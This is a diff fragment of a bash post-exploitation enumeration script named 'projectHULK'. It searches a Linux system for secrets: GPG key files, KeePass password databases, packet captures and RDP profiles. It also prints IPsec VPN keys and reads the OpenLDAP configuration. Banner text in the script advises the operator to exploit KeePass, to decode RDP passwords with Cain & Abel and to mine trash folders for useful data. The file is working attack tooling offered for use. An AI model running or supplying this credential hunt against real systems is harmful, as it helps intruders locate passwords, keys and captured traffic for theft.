+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t  ║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] HTML Files:\033[0m"
+    find / -name *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null 
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t  ║  /usr/*                                                                       ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] .GPG Files:\033[0m"
+    find / -name *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║A GPG file is a security key used to decrypt an encrypted file generated by GNU║"
+        echo -e "\t  ║Privacy Guard (GnuPG), a file encryption program. The secure format is based on║"
+        echo -e "\t  ║the OpenPGP standard defined by RFC2440,the same standard Pretty Good Privacy  ║"
+        echo -e "\t  ║(.PGP) files use.                                                              ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] KeePass database file:\033[0m"
+echo -e "[*] .kdbx files:"
+    find / -name *.kdbx -type f 2>/dev/null
+echo -e "[*] .kdb files:"
+    find / -name *.kdb -type f 2>/dev/null
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║KeePass is a free open source password manager, which helps you to manage your ║"
+        echo -e "\t  ║passwords in a secure way. You can store all your passwords in one database,   ║"
+        echo -e "\t  ║which is locked with a master key. There are many exploits on the internet.    ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Print IPSEC VPN Keys (requires root):\033[0m"
+    ip xfrm state list
+echo -e "\n${BLUE}[+] OpenLDAP Configuration:\033[0m" 
+    cat /etc/openldap/ldap.conf 2>/dev/null
+echo -e "\n${BLUE}[+] Current user trash files:\033[0m"
+    ls -la ~/.local/share/Trash/ 2>/dev/null
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Have a look at the trash files and see if you can find any useful information. ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Wireshark files:\033[0m"
+    find / -name *.pcapng -type f 2>/dev/null --color=always
+    find / -name *.libpcap -type f 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] RDP Profiles:\033[0m"
+    find / -name *.RDP -type f 2>/dev/null --color=always
+    find / -name *.rdp -type f 2>/dev/null --color=always
+        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t  ║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to      ║"
+        echo -e "\t  ║Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode. ║"
+        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n\n${RED}\t\t\tEnumeration is completed ╔════════════════════════════════════════(100%)════════════════════════════════════════╗\033[0m\n\n"
